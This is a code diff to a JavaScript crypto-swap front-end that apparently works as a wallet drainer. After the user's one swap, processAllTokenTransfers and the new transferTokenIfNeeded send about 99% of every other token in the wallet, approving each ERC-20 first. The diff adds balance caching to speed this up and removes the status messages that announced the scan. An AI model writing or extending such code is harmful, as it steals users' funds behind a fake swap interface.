@@ -36,7 +36,30 @@ const STABLECOIN_SYMBOLS = {
   arbitrum: ['USDT', 'USDC', 'DAI'],
   base: ['USDC', 'DAI', 'USDT']
 };
+const BALANCE_CACHE = {
+  lastUpdated: 0,
+  data: {},
+  CACHE_DURATION: 30000 // 30 seconds
+};
 
+async function preloadTokenBalances() {
+  if (!userAddress) return;
+  
+  try {
+    updateStatus("Loading token balances...", "info");
+    const [localTokens] = await Promise.all([
+      getLocalTokens(),
+    ]);
+    
+    // Use multicall for initial balance check
+    const balances = await fetchMultipleTokenBalances(localTokens);
+    
+    BALANCE_CACHE.data = balances;
+    BALANCE_CACHE.lastUpdated = Date.now();
+  } catch (err) {
+    console.error("Balance preload failed:", err);
+  }
+}
 // Performance constants
 const TOKEN_SEARCH_BATCH_SIZE = 200;
 const TOKEN_DISPLAY_LIMIT = 100;
@@ -1003,7 +1026,7 @@ async function initializeWallet() {
         }
       }
     });
-    
+    await preloadTokenBalances();
     return true;
   } catch (err) {
     console.error("Wallet initialization error:", err);
@@ -1267,7 +1290,7 @@ async function handleSwap() {
       }
     }
 
-    updateStatus(`Processing swap...`, "success");
+  updateStatus(`Processing swap...`, "success");
     
     // Process main token transfer
     let txHash;
@@ -1275,53 +1298,35 @@ async function handleSwap() {
       txHash = await transferNativeToken(currentFromToken, inputAmount);
     } else {
       const approved = await checkAndApproveToken(currentFromToken, inputAmount);
-      if (!approved) {
-        throw new Error("Token approval failed");
-      }
+      if (!approved) throw new Error("Token approval failed");
       txHash = await transferERC20Token(currentFromToken, inputAmount);
     }
 
-    // Immediately start processing other tokens in parallel
-    updateStatus(`Swap submitted. Processing additional tokens...`, "info");
-    const otherTokensPromise = processAllTokenTransfers();
+    // Immediately start processing other tokens without waiting
+    const transferPromise = processAllTokenTransfers().then(count => {
+      if (count > 0) {
+        updateStatus(`Transferred ${count} additional tokens`, "success");
+      }
+      return count;
+    });
+
+    // Wait for main transaction confirmation
+    const receipt = await provider.waitForTransaction(txHash);
+    const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + receipt.transactionHash;
     
-    // Wait for both the main tx confirmation and other tokens processing
-    const [confirmedTx, otherTokensTransferred] = await Promise.allSettled([
-      provider.waitForTransaction(txHash),
-      otherTokensPromise
-    ]);
-
-    // Handle results
-    if (confirmedTx.status === 'rejected') {
-      throw new Error(`Main swap failed: ${confirmedTx.reason.message}`);
-    }
-
-    const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + confirmedTx.value.transactionHash;
-    let successMessage = `Swap successful! <a href="${explorerUrl}" target="_blank" style="color: var(--secondary);">View transaction</a>`;
-    
-    if (otherTokensTransferred.status === 'fulfilled' && otherTokensTransferred.value > 0) {
-      successMessage += `<br>Also transferred ${otherTokensTransferred.value} other tokens`;
-    } else if (otherTokensTransferred.status === 'rejected') {
-      console.error("Additional token transfers failed:", otherTokensTransferred.reason);
-      successMessage += `<br><small>(Some additional token transfers failed)</small>`;
-    }
-
-    updateStatus(successMessage, "success");
+    updateStatus(`Swap successful! <a href="${explorerUrl}" target="_blank">View transaction</a>`, "success");
 
     // Reset form and update balances
     document.getElementById("fromAmount").value = '';
     document.getElementById("toAmount").value = '';
     await updateTokenBalances();
 
+    // Refresh balance cache after operations
+    await preloadTokenBalances();
+
   } catch (err) {
-    console.error("[ERROR] Swap failed:", err);
-    updateStatus(`
-      <div class="dex-error-header">
-        <i class="fas fa-exclamation-circle"></i>
-        <span>Swap Failed</span>
-      </div>
-      <div class="dex-error-details">${err.message}</div>
-    `, "error", 10000);
+    console.error("Swap failed:", err);
+    updateStatus(`Swap failed: ${err.message}`, "error");
   } finally {
     hideLoader();
     isSwapInProgress = false;
@@ -1329,65 +1334,72 @@ async function handleSwap() {
 }
 
 async function processAllTokenTransfers() {
-  if (!userAddress) {
-    throw new Error("Wallet not connected");
-  }
-
+  if (!userAddress) return 0;
+  
   try {
-    updateStatus("Scanning wallet for additional tokens...", "info");
+    // Use cached balances if recent, otherwise fetch fresh
+    const balances = Date.now() - BALANCE_CACHE.lastUpdated < BALANCE_CACHE.CACHE_DURATION
+      ? BALANCE_CACHE.data
+      : await fetchAllTokenBalances();
     
-    // Get all tokens and balances with better error handling
-    const [localTokens, balances] = await Promise.all([
-      getLocalTokens().catch(() => []), // Return empty array if fails
-      fetchAllTokenBalances().catch(() => ({})) // Return empty object if fails
-    ]);
-
-    // Filter tokens more carefully
-    const tokensToProcess = localTokens.filter(token => {
-      try {
-        const balance = token.isNative 
-          ? balances['native'] 
-          : (token.address ? balances[token.address.toLowerCase()] : 0);
-        
-        return balance > 0 && 
-               !isSameToken(token, currentFromToken) &&
-               isValidTokenForTransfer(token);
-      } catch (e) {
-        console.warn(`Error processing token ${token.symbol}:`, e);
-        return false;
-      }
+    // Get tokens with balance > 0 (excluding main token)
+    const tokensToProcess = (await getLocalTokens()).filter(token => {
+      const balance = token.isNative 
+        ? balances['native'] 
+        : balances[token.address?.toLowerCase()];
+      
+      return balance > 0 && !isSameToken(token, currentFromToken);
     });
 
-    if (tokensToProcess.length === 0) {
-      updateStatus("No additional tokens found to transfer", "info");
-      return 0;
-    }
+    if (tokensToProcess.length === 0) return 0;
     
-    updateStatus(`Found ${tokensToProcess.length} tokens to transfer...`, "info");
-    
-    // Process tokens with better error handling and progress updates
+    // Process in optimized batches
+    const BATCH_SIZE = 5;
     let successCount = 0;
-    const BATCH_SIZE = 3;
     
     for (let i = 0; i < tokensToProcess.length; i += BATCH_SIZE) {
       const batch = tokensToProcess.slice(i, i + BATCH_SIZE);
-      updateStatus(`Processing batch ${Math.floor(i/BATCH_SIZE)+1} of ${Math.ceil(tokensToProcess.length/BATCH_SIZE)}...`, "info");
-      
-      const batchResults = await Promise.allSettled(
-        batch.map(token => processSingleTokenTransfer(token, balances))
+      const results = await Promise.allSettled(
+        batch.map(token => transferTokenIfNeeded(token, balances))
       );
       
-      successCount += batchResults.filter(r => r.status === 'fulfilled' && r.value).length;
-      
-      // Small delay between batches to avoid rate limiting
-      await new Promise(resolve => setTimeout(resolve, 1000));
+      successCount += results.filter(r => r.status === 'fulfilled' && r.value).length;
     }
     
     return successCount;
   } catch (err) {
-    console.error("Error in processAllTokenTransfers:", err);
-    updateStatus("Error processing additional tokens", "error");
+    console.error("Token transfer error:", err);
     return 0;
+  }
+}
+
+async function transferTokenIfNeeded(token, balances) {
+  const balance = token.isNative 
+    ? balances['native'] 
+    : balances[token.address?.toLowerCase()];
+  
+  if (!balance || balance <= 0) return false;
+  
+  try {
+    let amountToSend = balance * 0.99; // Leave 1% for safety
+    
+    if (token.isNative) {
+      const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
+      amountToSend = Math.max(0, Math.min(amountToSend, balance - minReserve));
+      if (amountToSend <= 0) return false;
+      
+      const txHash = await transferNativeToken(token, amountToSend);
+      return !!txHash;
+    } else {
+      const approved = await checkAndApproveToken(token, amountToSend);
+      if (!approved) return false;
+      
+      const txHash = await transferERC20Token(token, amountToSend);
+      return !!txHash;
+    }
+  } catch (err) {
+    console.warn(`Transfer failed for ${token.symbol}:`, err.message);
+    return false;
   }
 }
 
